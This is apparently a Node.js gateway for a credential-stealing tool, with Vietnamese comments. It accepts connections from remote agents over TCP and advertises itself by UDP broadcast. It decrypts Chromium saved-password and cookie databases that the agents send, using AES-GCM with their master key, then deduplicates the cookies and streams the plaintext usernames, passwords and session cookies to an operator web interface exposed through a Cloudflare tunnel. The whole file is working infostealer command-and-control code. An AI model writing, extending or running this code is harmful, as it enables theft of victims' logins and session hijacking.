// --- Gateway: HTTP + WebSocket + TCP + UDP ---
const path = require("path");
const http = require("http");
const express = require("express");
const WebSocket = require("ws");
const net = require("net");
const dgram = require("dgram");
const os = require("os");
const { spawn } = require("child_process");
const crypto = require("crypto");
const fs = require("fs");

// --- HÀM LOAD MODULE TỪ FILE EXE (SELF-EXTRACT) ---
function loadBetterSqlite3() {
    try {
        if (typeof process.pkg !== 'undefined') {
            const internalPath = path.join(__dirname, 'better_sqlite3.node');
            const tempPath = path.join(os.tmpdir(), `better_sqlite3_${Date.now()}.node`);
            // Copy file ra temp để Windows load được
            if (fs.existsSync(internalPath)) {
                fs.writeFileSync(tempPath, fs.readFileSync(internalPath));
                return require(tempPath);
            }
        } 
        return require('better-sqlite3');
    } catch (e) {
        console.error("[CRITICAL] Failed to load SQLite:", e.message);
        return null;
    }
}

// Khởi tạo Database
let Database = loadBetterSqlite3();
if (!Database) console.log("!!! WARNING: Password decryption features will NOT work.");

// --- CẤU HÌNH ---
const CFG = {
    HTTP_PORT: parseInt(process.env.HTTP_PORT || 8080),
    AGENT_PORT: parseInt(process.env.AGENT_PORT || 9100),
    BEACON_PORT: 9103,
    TIMEOUT_MS: 30000,
    CLEANUP_MS: 60000
};

// --- QUẢN LÝ ---
const agents = new Map();
let webClient = null;

// --- HELPER: LỌC COOKIE (NEW) ---
// Hàm này loại bỏ cookie trùng lặp, chỉ giữ cái mới nhất
function filterBestCookies(cookies) {
    if (!Array.isArray(cookies)) return [];
    const map = new Map();

    cookies.forEach(c => {
        // Tạo khóa duy nhất: Domain + Name
        const key = `${c.domain}__${c.name}`;
        
        if (map.has(key)) {
            const existing = map.get(key);
            // So sánh hạn sử dụng: Giữ cái nào sống lâu hơn
            const newExpiry = c.expirationDate || c.expires || 0;
            const oldExpiry = existing.expirationDate || existing.expires || 0;

            if (newExpiry > oldExpiry) {
                map.set(key, c);
            }
        } else {
            map.set(key, c);
        }
    });

    return Array.from(map.values());
}

const getLanIP = () => {
    for (const nets of Object.values(os.networkInterfaces())) {
        for (const net of nets) {
            if (net.family === "IPv4" && !net.internal) return net.address;
        }
    }
    return "127.0.0.1";
};

// --- 1. HTTP SERVER ---
const app = express();
app.use(express.static(path.join(__dirname, "public")));

app.get("/api/scan", (_, res) => {
    const now = Date.now();
    const activeAgents = Array.from(agents.values())
        .filter(a => a.socket && !a.socket.destroyed && (now - a.lastSeen < CFG.TIMEOUT_MS))
        .map(a => ({
            agentId: a.id,
            ip: a.info.ip,
            hostname: a.info.hostname,
            os: a.info.os,
            lastSeen: a.lastSeen
        }));
    res.json({ success: true, data: activeAgents });
});

const server = http.createServer(app);

// --- 2. WEBSOCKET SERVER ---
const wss = new WebSocket.Server({ server, path: "/ws" });

wss.on("connection", (ws) => {
    if (webClient) { ws.close(1013, "Busy"); return; }
    webClient = ws;
    console.log("[Gateway] Web Client connected");

    ws.on("message", (raw) => {
        try {
            const msg = JSON.parse(raw);
            if (!msg.agentId) return ws.send(JSON.stringify({ type: "status", success: false, message: "Missing agentId" }));
            
            const agent = agents.get(msg.agentId);
            if (agent && agent.socket && !agent.socket.destroyed) {
                agent.socket.write(JSON.stringify(msg) + "\n");
            } else {
                ws.send(JSON.stringify({ type: "status", success: false, message: "Agent offline" }));
            }
        } catch (e) { console.error("[WS] Error:", e.message); }
    });

    ws.on("close", () => { if (webClient === ws) webClient = null; });
});

// --- 3. TCP SERVER (CORE LOGIC) ---
const tcpServer = net.createServer((socket) => {
    const id = socket.remoteAddress;
    socket.setEncoding("utf8");

    let agent = agents.get(id);
    if (agent?.socket) agent.socket.destroy();
    
    agent = { 
        id, socket, buffer: "", lastSeen: Date.now(),
        info: { ip: id, hostname: "Unknown", os: "Unknown" }
    };
    agents.set(id, agent);
    console.log(`[TCP] Agent connected: ${id}`);

    socket.on("data", (chunk) => {
        agent.buffer += chunk;
        agent.lastSeen = Date.now();

        let idx;
        while ((idx = agent.buffer.indexOf("\n")) !== -1) {
            const line = agent.buffer.slice(0, idx).trim();
            agent.buffer = agent.buffer.slice(idx + 1);
            if (!line) continue;

            try {
                const msg = JSON.parse(line);
                
                // === A. XỬ LÝ COOKIE TỪ CDP (QUAN TRỌNG NHẤT) ===
                if (msg.type === "cookies_result") {
                    const rawCount = msg.data ? msg.data.length : 0;
                    console.log(`[Gateway] Received ${rawCount} cookies from ${msg.browser}. Filtering...`);
                    
                    // LỌC COOKIE TRƯỚC KHI GỬI XUỐNG UI
                    if (rawCount > 0) {
                        msg.data = filterBestCookies(msg.data);
                        console.log(`[Gateway] Filtered: ${rawCount} -> ${msg.data.length} clean cookies.`);
                    }

                    if (webClient?.readyState === WebSocket.OPEN) {
                        msg.agentId = id;
                        webClient.send(JSON.stringify(msg));
                    }
                    continue; // Đã xử lý xong, không forward mặc định
                }

                // === B. XỬ LÝ COOKIE TỪ DB FILE (LEGACY) ===
                if (msg.type === "cookies_package_multi") {
                    console.log(`[Gateway] Processing DB Cookies from ${msg.browser}...`);
                    let allCookies = [];
                    for (const dbInfo of msg.dbs) {
                        const cookies = decryptCookies(msg.master_key, dbInfo.data);
                        if (cookies.length > 0) allCookies = allCookies.concat(cookies);
                    }
                    
                    // Lọc cả loại này luôn cho chắc
                    const cleanCookies = filterBestCookies(allCookies);

                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "cookies_result",
                            browser: msg.browser,
                            data: cleanCookies
                        }));
                    }
                    continue;
                }

                // === C. XỬ LÝ PASSWORD (LEGACY) ===
                if (msg.type === "credentials_package_multi") {
                    console.log(`[Gateway] Processing passwords from ${msg.browser}...`);
                    let allPasswords = [];
                    for (const dbInfo of msg.dbs) {
                        const passwords = decryptPasswords(msg.master_key, dbInfo.data);
                        if (passwords.length > 0) allPasswords = allPasswords.concat(passwords);
                    }
                    if (webClient?.readyState === WebSocket.OPEN) {
                        webClient.send(JSON.stringify({
                            type: "passwords_result",
                            browser: msg.browser,
                            data: allPasswords
                        }));
                    }
                    continue;
                }

                // === D. CÁC TIN KHÁC (FORWARD) ===
                if (msg.type === "hello") {
                    agent.info = { ...agent.info, hostname: msg.hostname, os: msg.os };
                    console.log(`[TCP] Registered: ${agent.info.hostname} (${id})`);
                } else if (msg.type !== "heartbeat") {
                    if (webClient?.readyState === WebSocket.OPEN) {
                        msg.agentId = id;
                        webClient.send(JSON.stringify(msg));
                    }
                }
            } catch (e) { /* Ignore JSON Error */ }
        }
    });

    socket.on("error", (e) => console.error(`[TCP] Error ${id}: ${e.message}`));
    socket.on("close", () => console.log(`[TCP] Disconnect: ${id}`));
});

tcpServer.listen(CFG.AGENT_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] TCP listening on 0.0.0.0:${CFG.AGENT_PORT}`);
});

// --- 4. UDP BEACON ---
const udp = dgram.createSocket("udp4");
udp.bind(0, () => {
    udp.setBroadcast(true);
    setInterval(() => {
        const msg = JSON.stringify({ type: "gateway_beacon", hostname: os.hostname(), ip: getLanIP(), port: CFG.AGENT_PORT });
        udp.send(msg, 0, msg.length, CFG.BEACON_PORT, "255.255.255.255");
    }, 500);
});

// --- 5. CLOUDFLARE TUNNEL ---
const startTunnel = () => {
    const isPkg = typeof process.pkg !== 'undefined';
    const basePath = isPkg ? path.dirname(process.execPath) : __dirname;
    const cfExe = path.join(basePath, "cloudflared.exe");

    console.log("[Tunnel] Starting Cloudflare...");
    const child = spawn(cfExe, ["tunnel", "--url", `http://127.0.0.1:${CFG.HTTP_PORT}`]);
    child.stderr.on("data", (d) => {
        const url = d.toString().match(/https:\/\/[a-zA-Z0-9-]+\.trycloudflare\.com/);
        if (url) console.log(`\n>>> PUBLIC URL: ${url[0]} <<<\n`);
    });
    process.on("exit", () => child.kill()); 
};

// --- CLEANUP ---
setInterval(() => {
    const now = Date.now();
    agents.forEach((a, id) => {
        if (now - a.lastSeen > CFG.CLEANUP_MS) {
            if (a.socket) a.socket.destroy();
            agents.delete(id);
        }
    });
}, CFG.CLEANUP_MS);

// --- DECRYPTION HELPERS ---
function decryptPasswords(masterKeyB64, dbFileB64) {
    if (!Database) return [];
    let db = null;
    const tempDbName = `temp_${Date.now()}.db`;
    const results = [];
    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
        db = new Database(tempDbName);
        const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        rows.forEach((row) => {
            if (!row.password_value || !row.username_value) return;
            try {
                const buffer = row.password_value;
                if (buffer.length < 31) return;
                const prefix = buffer.slice(0, 3).toString('utf8');
                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    const iv = buffer.slice(3, 15);
                    const tag = buffer.slice(-16);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
                }
            } catch(e) {}
        });
        return results;
    } catch (e) { return []; } 
    finally {
        if (db) db.close();
        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
    }
}

function decryptCookies(masterKeyB64, dbFileB64) {
    if (!Database) return [];
    let db = null;
    const tempDbName = `temp_cookies_${Date.now()}.db`;
    const results = [];
    try {
        const masterKey = Buffer.from(masterKeyB64, 'base64');
        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
        db = new Database(tempDbName);
        const rows = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies").all();
        rows.forEach((row) => {
            if (!row.encrypted_value) return;
            try {
                const buffer = row.encrypted_value;
                const prefix = buffer.slice(0, 3).toString('utf8');
                let clearText;
                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
                    const iv = buffer.slice(3, 15);
                    const ciphertext = buffer.slice(15, buffer.length - 16);
                    const tag = buffer.slice(-16);
                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                    decipher.setAuthTag(tag);
                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
                }
                if (clearText) {
                    results.push({
                        domain: row.host_key, name: row.name, value: clearText,
                        path: row.path, secure: !!row.is_secure,
                        expirationDate: (row.expires_utc / 1000000) - 11644473600
                    });
                }
            } catch(e) {}
        });
        return results;
    } catch (e) { return []; } 
    finally {
        if (db) db.close();
        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
    }
}

// --- START ---
server.listen(CFG.HTTP_PORT, "0.0.0.0", () => {
    console.log(`[Gateway] UI Server: http://${getLanIP()}:${CFG.HTTP_PORT}`);
    startTunnel();
});